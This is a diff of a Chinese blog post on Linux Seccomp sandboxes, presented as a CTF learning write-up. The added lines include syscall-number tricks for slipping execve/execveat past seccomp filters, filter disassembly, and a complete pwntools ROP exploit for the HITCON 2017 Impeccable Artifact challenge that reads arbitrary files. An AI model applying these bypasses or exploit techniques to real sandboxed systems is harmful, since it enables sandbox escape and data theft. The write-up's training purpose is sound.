@@ -127,7 +127,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    3.6k 字
+                    4.6k 字
                   </span>
                 
 
@@ -135,7 +135,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      18 分钟
+                      23 分钟
                   </span>
                 
 
@@ -163,9 +163,9 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <p>Seccomp（Secure Computing mode）是 Andrea Arcangeli 在 2005 年设计的，其目的是解决 grid computing 中的安全问题，比如你打算出租你的 CPU 资源，但又担心不可信的代码会破坏你的系统。那么，Seccomp 则可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。</p>
+              <p>Seccomp 可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。</p>
 <a id="more"></a>
-<h1 id="Seccomp-Sandbox"><a href="#Seccomp-Sandbox" class="headerlink" title="Seccomp Sandbox"></a>Seccomp Sandbox</h1><p>Seccomp 是 Linux 提供的一种沙箱机制，可以用来限制程序可以使用和不可使用的系统调用。简洁、优美是 Seccomp 的优点，但只能支持“纯计算型”代码却使得其应用受到很大限制。比如，Seccomp 模式的进程不能动态分配内存、不能与其它进程使用共享内存、不能使用新的文件描述符、等等。如果要支持具有丰富功能的应用程序，则需要另外的方法来截获并处理其它系统调用。Seccomp 沙箱主要有两种模式，<code>SECCOMP_SET_MODE_STRICT</code> 只运行调用 4 个系统调用 <code>read()</code>、<code>write()</code>、<code>exit()</code>、<code>sigreturn()</code> 四个系统调用，而 <code>SECCOMP_SET_MODE_FILTER</code> 则允许通过 BPF 指定系统调用的黑名单或者白名单。</p>
+<h1 id="Seccomp-Sandbox"><a href="#Seccomp-Sandbox" class="headerlink" title="Seccomp Sandbox"></a>Seccomp Sandbox</h1><p>Seccomp（Secure Computing mode）是 Linux 提供的一种沙箱机制，可以用来限制程序可以使用和不可使用的系统调用。简洁、优美是 Seccomp 的优点，但只能支持“纯计算型”代码却使得其应用受到很大限制。比如，Seccomp 模式的进程不能动态分配内存、不能与其它进程使用共享内存、不能使用新的文件描述符、等等。如果要支持具有丰富功能的应用程序，则需要另外的方法来截获并处理其它系统调用。Seccomp 沙箱主要有两种模式，<code>SECCOMP_SET_MODE_STRICT</code> 只运行调用 4 个系统调用 <code>read()</code>、<code>write()</code>、<code>exit()</code>、<code>sigreturn()</code> 四个系统调用，而 <code>SECCOMP_SET_MODE_FILTER</code> 则允许通过 BPF 指定系统调用的黑名单或者白名单。</p>
 <p>Seccomp 本身是一种很安全的技术，但是在 <code>SECCOMP_SET_MODE_FILTER</code> 环境下通常会因为 BPF 使用不正确导致沙箱存在被绕过的可能。</p>
 <ul>
 <li>限制一个程序能够使用的系统调用，可以是黑名单或白名单；</li>
@@ -175,7 +175,7 @@
 <blockquote>
 <p>早期直接使用 <code>prctl</code> 来开启 Seccomp。现在已经有 libseccomp 库，可以直接使用 <code>seccomp_init</code>、<code>seccomp_rule_add</code>、<code>seccomp_load</code> 来设定规则。</p>
 </blockquote>
-<h2 id="Seccomp-using-prctl"><a href="#Seccomp-using-prctl" class="headerlink" title="Seccomp using prctl"></a>Seccomp using <code>prctl</code></h2><p>Seccomp 采用 Berkeley Packet Filter（BPF）格式，原本在防火墙（iptables）中用来过滤封包。使用 Seccomp 需要有 CAP_SYS_ADMIN 权限（相当于 root 的权限），非 root 用户则通过设置 PR_SET_NO_NEW_PRIVS 位来获取 CAP_SYS_ADMIN 的权限。这样能保证 Seccomp 对所有用户都能起作用，并且会使子进程即 execve 后的进程依然受控。有了 CAP_SYS_ADMIN 权限后，就可以开启相应的自定义规则。具体的规则定义在参数 <code>prog</code> 中：</p>
+<h2 id="Seccomp-using-prctl"><a href="#Seccomp-using-prctl" class="headerlink" title="Seccomp using prctl"></a>Seccomp using <code>prctl</code></h2><p>Seccomp 采用 Berkeley Packet Filter（BPF）格式，原本在防火墙（iptables）中用来过滤封包。使用 Seccomp 需要有 <code>CAP_SYS_ADMIN</code> Capability（相当于 root 的权限），非 root 用户则通过设置 PR_SET_NO_NEW_PRIVS 位来获取 <code>CAP_SYS_ADMIN</code> Capability。这样能保证 Seccomp 对所有用户都能起作用，并且会使子进程即 execve 后的进程依然受控。获取 <code>CAP_SYS_ADMIN</code> Capability 后，就可以开启相应的自定义规则。具体的规则定义在参数 <code>prog</code> 中：</p>
 <pre><code class="cpp">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); // 获取 CAP_SYS_ADMIN 权限
 prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog); // 开启自定义的过滤规则
 </code></pre>
@@ -648,6 +648,7 @@ Makefile  dd  sec  sec.asm  sec.c  sec.o
 <h2 id="没有道理的绕过方法"><a href="#没有道理的绕过方法" class="headerlink" title="没有道理的绕过方法"></a>没有道理的绕过方法</h2><ul>
 <li>部分调用号是给 x32 用的，但在 x86_64 下一样能用</li>
 <li>59、520、59+0x40000000、520+0x40000000 都是 execve</li>
+<li>322、322+0x40000000、545、545+0x40000000（stub_execveat，和 execve 类似）也可以</li>
 </ul>
 <h1 id="Binary-Test"><a href="#Binary-Test" class="headerlink" title="Binary Test"></a>Binary Test</h1><p>使用 seccomp-tools 对一些题目进行测试。</p>
 <h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw-orw"></a>pwnable.tw-orw</h2><p>这道题当时是只能用 read、open、write 三个调用来读 flag。这里用 seccomp-tools 来查看一下是怎么实现的限制：</p>
@@ -706,8 +707,167 @@ System started!
  0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW
  0030: 0x06 0x00 0x00 0x00000000  return KILL
 </code></pre>
-<h1 id="Related-CTF-Challs"><a href="#Related-CTF-Challs" class="headerlink" title="Related CTF Challs"></a>Related CTF Challs</h1><p>TODO:</p>
-<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=gQXyZY7Ucjc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gQXyZY7Ucjc</a><br><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br><a href="https://www.linuxidc.com/Linux/2015-02/112913.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2015-02/112913.htm</a><br><a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Seccomp</a><br><a href="https://atum.li/2017/04/25/linuxsandbox/#seccomp" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox/#seccomp</a><br><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+<h1 id="Related-CTF-Challs"><a href="#Related-CTF-Challs" class="headerlink" title="Related CTF Challs"></a>Related CTF Challs</h1><p>CTF 中涉及 Seccomp 的一些二进制题。记录一下用于在 IDA 中插入的 Seccomp 结构体：</p>
+<pre><code class="cpp">struct sock_filter {    /* Filter block */
+    uint16_t    code;   /* Actual filter code */
+    uint8_t    jt;    /* Jump true */
+    uint8_t    jf;    /* Jump false */
+    uint32_t    k;      /* Generic multiuse field */
+};
+
+struct sock_fprog {    /* Required for SO_ATTACH_FILTER. */
+    unsigned short        len;    /* Number of filter blocks */
+    struct sock_filter *filter;
+};
+</code></pre>
+<h2 id="HITCON-2017-seccomp"><a href="#HITCON-2017-seccomp" class="headerlink" title="HITCON-2017-seccomp"></a>HITCON-2017-seccomp</h2><p>先是一道逆向。程序不难，主要是逆 Seccomp 的部分来得出正确的 6 个参数。这里放一下<a href="https://blukat29.github.io/2017/11/hitcon-quals-2017-seccomp/" target="_blank" rel="noopener">其他大佬的 Writeup</a>：</p>
+<pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  signed int i; // [rsp+Ch] [rbp-54h]
+  struct sock_fprog prog; // [rsp+10h] [rbp-50h]
+  __int64 args[6]; // [rsp+20h] [rbp-40h]
+  unsigned __int64 v7; // [rsp+58h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  prog.len = 4059;
+  prog.filter = (struct sock_filter *)&amp;s;
+  memset(args, 0, sizeof(args));
+  for ( i = 0; i &lt;= 4; ++i )
+    _isoc99_scanf(&quot;%llu&quot;, &amp;args[i]);
+  prctl(38, 1LL, 0LL, 0LL, 0LL);
+  if ( prctl(22, 2LL, &amp;prog) )
+  {
+    perror(&quot;prctl&quot;);
+    exit(1);
+  }
+  syscall(4919LL, args[0], args[1], args[2], args[3], args[4], args[5]);
+  printf(&quot;Excellent! flag: hitcon{%s}\n&quot;, args);
+  return 0;
+}
+</code></pre>
+<h2 id="HITCON-2017-Impeccable-Artifact"><a href="#HITCON-2017-Impeccable-Artifact" class="headerlink" title="HITCON-2017-Impeccable_Artifact"></a>HITCON-2017-Impeccable_Artifact</h2><p>程序保护全开，且能对栈上的任意 8 个字节进行读写，同时没有对下标进行检查，所以能造成任意地址读写。然后一开始在 prepare 函数中对 syscall 进行了限制：</p>
+<pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  int c; // [rsp+8h] [rbp-658h]
+  int idx; // [rsp+Ch] [rbp-654h]
+  __int64 arr[201]; // [rsp+10h] [rbp-650h]
+  unsigned __int64 v7; // [rsp+658h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  prepare();
+  memset(arr, 0, 0x640uLL);
+  while ( 1 )
+  {
+    menu();
+    idx = 0;
+    _isoc99_scanf(&quot;%d&quot;, &amp;c);
+    if ( c != 1 &amp;&amp; c != 2 )
+      break;
+    puts(&quot;Idx?&quot;);
+    _isoc99_scanf(&quot;%d&quot;, &amp;idx);
+    if ( c == 1 )
+    {
+      printf(&quot;Here it is: %lld\n&quot;, arr[idx]);
+    }
+    else
+    {
+      puts(&quot;Give me your number:&quot;);
+      _isoc99_scanf(&quot;%lld&quot;, &amp;arr[idx]);
+    }
+  }
+  return 0LL;
+}
+</code></pre>
+<p>用 seccomp-tools 中可以查看到程序判断了系统架构，然后将传入的第三个参数作为系统调用号（即 rdx 等于 rax），后面会判断 sys_number 和 rdx 是否相等，如果相等也能过 check，这个地方可以构造出一些本身被限制的函数。然后允许 read、write、fstat 等一些函数：</p>
+<pre><code> line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018
+ 0002: 0x20 0x00 0x00 0x00000020  A = args[2]
+ 0003: 0x07 0x00 0x00 0x00000000  X = A
+ 0004: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019
+ 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019
+ 0007: 0x15 0x0b 0x00 0x00000005  if (A == fstat) goto 0019
+ 0008: 0x15 0x0a 0x00 0x00000008  if (A == lseek) goto 0019
+ 0009: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0011
+ 0010: 0x15 0x00 0x03 0x0000000a  if (A != mprotect) goto 0014
+ 0011: 0x87 0x00 0x00 0x00000000  A = X
+ 0012: 0x54 0x00 0x00 0x00000001  A &amp;= 0x1
+ 0013: 0x15 0x04 0x05 0x00000001  if (A == 1) goto 0018 else goto 0019
+ 0014: 0x1d 0x04 0x00 0x0000000b  if (A == X) goto 0019
+ 0015: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0019
+ 0016: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0019
+ 0017: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0019
+ 0018: 0x06 0x00 0x00 0x00000000  return KILL
+ 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+</code></pre><p>经过调试可以找到某些地址泄漏 Binary 和 libc，然后改 ret 处的代码构造 ROP 就能任意文件读取：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]
+
+p = process(&#39;./artifact&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+def cmd(c):
+    p.recvuntil(&#39;Choice?\n&#39;)
+    p.sendline(str(c))
+
+def show(idx):
+    cmd(1)
+    p.recvuntil(&#39;Idx?\n&#39;)
+    p.sendline(str(idx))
+    p.recvuntil(&#39;Here it is:&#39;)
+    return int(p.recvuntil(&#39;\n&#39;, drop=True))
+
+def memo(idx, num):
+    cmd(2)
+    p.recvuntil(&#39;Idx?\n&#39;)
+    p.sendline(str(idx))
+    p.recvuntil(&#39;Give me your number:\n&#39;)
+    p.sendline(str(num))
+
+def leave():
+    cmd(3)
+
+binary_base = show(202) - 0xbb0
+bss_buf = binary_base + 0x202000
+info(&#39;binary_base = &#39; + hex(binary_base))
+offset = 0x00007ffff7a2d830 - 0x7ffff7a0d000
+libc_base = show(203) - offset
+info(&#39;libc_base = &#39; + hex(libc_base))
+pop_rdi_ret = libc_base + next(libc.search(asm(&#39;pop rdi ; ret&#39;)))
+pop_rsi_ret = libc_base + next(libc.search(asm(&#39;pop rsi ; ret&#39;)))
+pop_rdx_ret = libc_base + next(libc.search(asm(&#39;pop rdx ; ret&#39;)))
+read_addr = libc_base + libc.symbols[&#39;read&#39;]
+write_addr = libc_base + libc.symbols[&#39;write&#39;]
+open_addr = libc_base + libc.symbols[&#39;open&#39;]
+
+def set_syscall(idx, syscall, rdi, rsi, rdx):
+    memo(idx, pop_rdi_ret)
+    memo(idx + 1, rdi)
+    memo(idx + 2, pop_rsi_ret)
+    memo(idx + 3, rsi)
+    memo(idx + 4, pop_rdx_ret)
+    memo(idx + 5, rdx)
+    memo(idx + 6, syscall)
+
+file_name_addr = bss_buf + 0x500
+buf_addr = bss_buf + 0x600
+set_syscall(203, read_addr, 0, file_name_addr, 0x20) # read file&#39;s name
+set_syscall(210, open_addr, file_name_addr, 0, 2) # open&#39;s syscall number == 2
+set_syscall(217, read_addr, 3, buf_addr, 0x1000) # read file&#39;s content
+set_syscall(224, write_addr, 1, buf_addr, 0x1000) # write to stdout
+leave()
+p.sendline(&#39;exp.py\x00&#39;)
+p.interactive()
+</code></pre>
+<h2 id="BSides-CTF-2015-Baby-Playpen-Fence"><a href="#BSides-CTF-2015-Baby-Playpen-Fence" class="headerlink" title="BSides-CTF-2015-Baby_Playpen_Fence"></a>BSides-CTF-2015-Baby_Playpen_Fence</h2><p>TODO</p>
+<h2 id="BSides-CTF-2015-Big-Prison-Fence"><a href="#BSides-CTF-2015-Big-Prison-Fence" class="headerlink" title="BSides-CTF-2015-Big_Prison_Fence"></a>BSides-CTF-2015-Big_Prison_Fence</h2><p>TODO</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=gQXyZY7Ucjc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gQXyZY7Ucjc</a><br><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br><a href="https://www.linuxidc.com/Linux/2015-02/112913.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2015-02/112913.htm</a><br><a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Seccomp</a><br><a href="https://atum.li/2017/04/25/linuxsandbox/#seccomp" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox/#seccomp</a><br><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a><br><a href="https://github.com/briansp8210/CTF-writeup/tree/master/HITCON-2017-qual/Impeccable-Artifact" target="_blank" rel="noopener">https://github.com/briansp8210/CTF-writeup/tree/master/HITCON-2017-qual/Impeccable-Artifact</a><br><a href="https://blukat29.github.io/2017/11/hitcon-quals-2017-artifact/" target="_blank" rel="noopener">https://blukat29.github.io/2017/11/hitcon-quals-2017-artifact/</a></p>
 
             </div>
             <hr>
@@ -717,6 +877,8 @@ System started!
                 
                   <span>
                 <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                     
                       <a class="hover-with-bg" href="/tags/linux/">linux</a>
                     
@@ -730,10 +892,15 @@ System started!
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
                     
+                      <a href="/2020/04/18/Linux-Sandbox-Ptrace/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Linux Sandbox - Ptrace</span>
+                      </a>
+                    
                   </div>
                   <div class="post-next col-12 col-md-6">
                     
-                      <a href="/2020/04/13/[TODO]Fuzzing-to-Exploit/">
+                      <a href="/2020/04/13/Fuzzing-to-Exploit/">
                         <span>Fuzzing to Exploit</span>
                         <i class="fa fa-chevron-right"></i>
                       </a>
